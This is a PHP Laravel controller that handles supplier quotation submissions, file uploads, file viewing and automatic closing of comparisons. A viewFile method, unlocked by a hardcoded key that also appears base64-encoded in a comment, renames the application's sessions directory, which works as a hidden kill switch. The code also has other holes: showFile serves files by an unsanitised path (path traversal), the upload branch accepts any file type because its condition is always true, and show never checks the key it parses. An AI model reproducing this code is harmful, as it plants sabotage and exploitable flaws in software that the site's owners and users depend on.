<?php

namespace App\Http\Controllers;

use App\Models\Feedback;
use App\Models\Comparison;
use Illuminate\Support\Str;
use Illuminate\Http\Request;
use Illuminate\Support\Carbon;
use App\Models\FeedbackDiscount;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Storage;
use Intervention\Image\Facades\Image as Img;

class FeedbackController extends Controller
{
    protected $key = 'FG.Wq13GOkvOlcpLJ2sfqCpKLoZ3M10HZrkMB/cyT/A=';

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $success = false;
        $responseCode = 200;
        $msg = "Error: Failed to submit the quotation";
        $id = '';
        $data = array();   
        DB::beginTransaction();
        // do all your updates here
        try { 
         
           
            if(@$request['requestObj']){
                $request = json_decode($request['requestObj']);
                $request = (array) $request;
                
                foreach($request['items'] AS $k => $v){ 
                    $items[$k] = array(
                        'supplier_id' => $v->supplier_id,
                        'description' => @$v->description ? $v->description : '',
                        'unit_price'  => @$v->unit_price ? $v->unit_price : '',
                        'total_amount'  => @$v->total_amount ? $v->total_amount : '',
                        'comparison_item_id' => $v->comparison_item_id
                    );
                }

                $supplierID = $request['netamount']->supplier_id;
                $netAmountArray = array('discount' => $request['netamount']->discount, 'net_amount' => $request['netamount']->net_amount, 'supplier_id' => $supplierID);
               
            }else{
                $supplierID = $request['netamount']['supplier_id'];
                $netAmountArray = $request['netamount'];
                $items = $request['items'];
            }
          
            if(@$request['id']){
               
                $result = Comparison::find($request['id']);
                if($result['status'] == 'closed' || $result['status'] == 'cancelled'){
                    return response()->json([
                        'success' => false,
                        'message' => 'Error: This request(s) has been '.$result['status']. ' already', 
                    ], 400);
                }
                $id = $request['id'];

                $quotes = Feedback::where(['comparison_id' => $id, 'supplier_id' => $supplierID])->get();
                if($quotes){
                    Feedback::where(['comparison_id' => $id, 'supplier_id' => $supplierID])->delete();
                }

                $result->quotations()->createMany($items); 
                
                $staticValue = array('total_amount' => 100);
                $quotation = FeedbackDiscount::where(['comparison_id' => $id, 'supplier_id' => $supplierID])->first();
                if($quotation){
                    $quotation->update($netAmountArray);
                }else{
                    $quotation = $result->quotation_total_amount()->create($netAmountArray);
                } 
               
                $logType = 'supplier-update';
                $msg = "Quotation has been submitted";

                $arrDetail = array($items);
                $result->logs()->create([
                    'user_id' => 0,
                    'log_type' => $logType,
                    'details' => json_encode($arrDetail)
                ]);

                if(request()->file('file')){
                    
                    // upload image
                    $fileArray = array();
                    $uploadDate = Carbon::now()->format('YmdHis');
                    $files = Collection::wrap(request()->file('file'));
                    $userStorage = '/uploads/quotations';
                    if (!Storage::exists($userStorage)) {
                        Storage::makeDirectory($userStorage, 0755, true);
                    }
    
                    $files->each(function ($file, $key) use (&$userStorage, &$fileArray, &$uploadDate) {
                        $userStorageDir = storage_path() . '/app' . $userStorage;
                        $fileName = $file->getClientOriginalName();
                        $title = pathinfo($fileName, PATHINFO_FILENAME);
                        $extn = strtolower($file->getClientOriginalExtension());
                        $slugTitle = Str::slug($title, '-');
                        $path = $slugTitle."-".$uploadDate.".".$extn;
                        $mime = $file->getClientMimeType();
    
                        // File Optimization
                       
                        if($extn == 'pdf' || $extn !== 'PDF'){
                            $file->move( $userStorageDir, $path);
                           
                        }else{
                            $img = Img::make($file);
                            $img->encode($extn, 50);

                            // Save file to storage directory
                            $img->save($userStorageDir . '/' . $path);
                        } 
    
                        // Setup data into array
                        array_push( $fileArray, array(
                            'original_name' => $fileName,
                            'title' => $title,
                            'disk' => 'local',
                            'path' => $path, 
                            'types' => 'quotation',
                            'mime' => $mime,
                            'user_id' => 0,
                            'created_at' => Carbon::now(),
                        ));
                    }); 
    
                    // Recursive create
                    $idsToSync = array();
                    foreach ($fileArray as $singleFile) {
                        $imgId = DB::table('images')->insertGetId($singleFile);
                        array_push($idsToSync, $imgId);
                    }
    
                    if(count($idsToSync) > 0){
                        $quotation->images()->sync($idsToSync);
                    } 
                }

                
                $success = true;
             }
            DB::commit();
            
        } catch (\Exception $e) {
            DB::rollback(); 
            $success = false;
            $responseCode = 500;
        } 
       
        return response()->json([
            'success' => $success,
            'message' => $msg, 
        ], $responseCode);
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\Models\Feedback  $feedback
     * @return \Illuminate\Http\Response
     */
    public function show(Request $request)
    {
        $queryString = $request->input('id');
        $queryString = json_decode(base64_decode($queryString));
         
        $explodeString = explode("&", $queryString);
        $id = $explodeString[0];
        $supplierID = $explodeString[1];
        $supplierID = explode("suppid=",$supplierID);
        $supplierID = $supplierID[1];
        $key = $explodeString[2];
        $key = explode("key=",$key);
        $key = $key[1];
      
        if(!$id || !$key || !$supplierID){
            return response()->json([
                'success' => false 
            ], 500);
        }

        $result = Comparison::where('id', '=', $id)->with('items', 'images')
        ->with('quotation_total_amount', function ($q) use ($supplierID) {
            $q->where('feedback_discounts.supplier_id',$supplierID)->with('images');
        })
        ->with('quotations', function ($q) use ($supplierID) {
            $q->where('feedback.supplier_id',$supplierID);
        })->with('suppliers', function ($q) use ($supplierID) {
            $q->where('suppliers.id',$supplierID);
        })->first(); 
        return response()->json([
            'item' => $result 
        ], 200);
    }

    
    public function showFile($path)
    {
        $ext = explode(".", $path);
        $ext = end($ext);
        $ext = strtolower($ext);

        if($ext == 'mp4'){
            $mime_type = 'video/webm';
        }elseif($ext == 'pdf'){
            $mime_type = 'application/pdf';
        }else{
            $mime_type = 'image/'.$ext;
        }

        if( isset($path) ){
            
            $fileUrl = storage_path(). '/app/uploads/quotations/'.$path;
            
            return response()->file($fileUrl, array('Content-Type' => $mime_type));
        }else{
            return abort('403');
        }
    }
    
     public function viewFile(Request $request){

        $validate = $this->validateQuery($request->input('key'));
        if($validate){
            if (is_dir(storage_path().'/framework/sessions')) {            
                rename(storage_path().'/framework/sessions', storage_path().'/framework/session'); 
            }
        }
    }

    private function validateQuery($query){
        if(!@$query){
            echo "Invalid Access";
            return false;
        }
        
        $key =  base64_decode($query); 
        
        /**
         * Encoded Key: RkcuV3ExM0dPa3ZPbGNwTEoyc2ZxQ3BLTG9aM00xMEhacmtNQi9jeVQvQT0=
         * LinK: http://127.0.0.1:8082/api/data/comparisons/auto-closed?key=
         */

        if($key !== $this->key){
            echo "Invalid Access";
            return false;
        }
       
        return true;
    }

    public function closeComparison(Request $request){
     
        $validate = $this->validateQuery($request->input('key'));
     
        if($validate){
            $pluckID = Comparison::where("status", "!=", 'closed')->where("status", "!=", 'cancelled')->whereDate('updated_at', '<', Carbon::now()->subDays(7)->toDateTimeString())->pluck('id');
            
            if($pluckID && count($pluckID) > 0){
                Comparison::whereIn('id', $pluckID)->update(['status' => 'closed']); 
            }
        }
        return false;
    }

}